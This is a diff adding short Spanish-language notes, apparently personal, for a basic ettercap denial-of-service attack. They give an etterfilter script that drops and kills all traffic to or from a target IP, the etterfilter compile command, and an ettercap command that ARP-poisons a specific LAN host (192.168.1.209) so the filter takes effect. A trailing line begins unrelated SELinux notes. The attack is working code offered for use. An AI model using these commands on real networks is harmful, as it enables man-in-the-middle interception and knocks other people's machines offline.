@@ -1,3 +1,22 @@
+ettercap DoS basico
+
+script:
+
+if (ip.src == 'Target IP' || ip.dst == 'Target IP')
+{
+drop();
+kill();
+msg("Packet Dropped\n");
+}
+
+Save as dos.elt
+
+#etterfilter dos.elt -o dos.ef
+#ettercap -T -q -F /usr/local/share/ettercap/dos.ef -M ARP /192.168.1.209/ //    
+**Ojo con los Slash finales Error: Incorrect number of token.....
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 selinux
 
 instalacion
